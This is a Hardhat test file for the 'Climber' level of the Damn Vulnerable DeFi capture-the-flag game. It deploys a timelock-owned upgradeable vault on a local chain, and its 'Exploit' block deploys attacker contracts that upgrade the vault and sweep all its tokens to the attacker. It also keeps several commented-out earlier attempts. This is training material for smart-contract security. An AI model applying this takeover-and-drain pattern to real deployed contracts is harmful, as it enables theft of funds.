const { ethers, upgrades } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] Climber", function () {
  let deployer, proposer, sweeper, attacker;

  // Vault starts with 10 million tokens
  const VAULT_TOKEN_BALANCE = ethers.utils.parseEther("10000000");

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, proposer, sweeper, attacker] = await ethers.getSigners();

    await ethers.provider.send("hardhat_setBalance", [
      attacker.address,
      "0x16345785d8a0000", // 0.1 ETH
    ]);
    expect(await ethers.provider.getBalance(attacker.address)).to.equal(
      ethers.utils.parseEther("0.1")
    );

    // Deploy the vault behind a proxy using the UUPS pattern,
    // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
    this.vault = await upgrades.deployProxy(
      await ethers.getContractFactory("ClimberVault", deployer),
      [deployer.address, proposer.address, sweeper.address],
      { kind: "uups" }
    );

    expect(await this.vault.getSweeper()).to.eq(sweeper.address);
    expect(await this.vault.getLastWithdrawalTimestamp()).to.be.gt("0");
    expect(await this.vault.owner()).to.not.eq(ethers.constants.AddressZero);
    expect(await this.vault.owner()).to.not.eq(deployer.address);

    // Instantiate timelock
    let timelockAddress = await this.vault.owner();

    console.log(timelockAddress);
    this.timelock = await (
      await ethers.getContractFactory("ClimberTimelock", deployer)
    ).attach(timelockAddress);

    // Ensure timelock roles are correctly initialized
    expect(
      await this.timelock.hasRole(
        await this.timelock.PROPOSER_ROLE(),
        proposer.address
      )
    ).to.be.true;
    expect(
      await this.timelock.hasRole(
        await this.timelock.ADMIN_ROLE(),
        deployer.address
      )
    ).to.be.true;

    // Deploy token and transfer initial token balance to the vault
    this.token = await (
      await ethers.getContractFactory("DamnValuableToken", deployer)
    ).deploy();
    await this.token.transfer(this.vault.address, VAULT_TOKEN_BALANCE);
  });

  it("Exploit", async function () {
    // https://forum.openzeppelin.com/t/execute-upgrade-using-different-signer/14264
    // this.upgradedAttackerContract = await ethers.getContractFactory(
    //   "UpgradedAttacker",
    //   attacker
    // );
    // this.attackerContract = await (
    //   await ethers.getContractFactory("ClimberAttacker", attacker)
    // ).deploy(this.timelock.address, this.vault.address, attacker.address);
    // await this.attackerContract.connect(attacker).attack();
    // const compromisedVault = await upgrades.upgradeProxy(
    //   this.vault.address,
    //   this.upgradedAttackerContract
    // );
    // await compromisedVault.connect(attacker).sweepFunds(this.token.address);
    // console.log(this.vault.address);
    // console.log(compromisedVault.address);

    // console.log("Vault ", this.vault.address);
    // console.log("Timelock ", this.timelock.address);
    // console.log("Attacker ", attacker.address);
    // const AttackerContractFactory = await ethers.getContractFactory(
    //   "ClimberExploit",
    //   attacker
    // );
    // const attackerContract = await AttackerContractFactory.deploy(
    //   this.timelock.address,
    //   this.vault.address
    // );
    // await attackerContract.connect(attacker).attack();
    // await this.vault.connect(attacker).sweepFunds(this.token.address);

    // //original contracts
    // const attackTimelock = this.timelock.connect(attacker);
    // const attackVault = this.vault.connect(attacker);

    // Deploy our attack contracts
    /// New Vault
    const AttackVault = await ethers.getContractFactory(
      "AttackVault",
      attacker
    );
    const attackNewVault = await AttackVault.deploy();

    /// Attack Contract
    const AttackClimberTimelock = await ethers.getContractFactory(
      "AttackClimberTimelock",
      attacker
    );
    //arg: timelock, original vault, new vault, attacker address, DVT address
    const attackTimelockContract = await AttackClimberTimelock.deploy(
      this.timelock.address,
      this.vault.address
    );
    await attackTimelockContract
      .connect(attacker)
      .attack(attackNewVault.address);
    await this.vault.connect(attacker).sweepFunds(this.token.address);
    //Attack: call execute with our 4 call, s
  });

  after(async function () {
    /** SUCCESS CONDITIONS */
    expect(await this.token.balanceOf(this.vault.address)).to.eq("0");
    expect(await this.token.balanceOf(attacker.address)).to.eq(
      VAULT_TOKEN_BALANCE
    );
  });
});
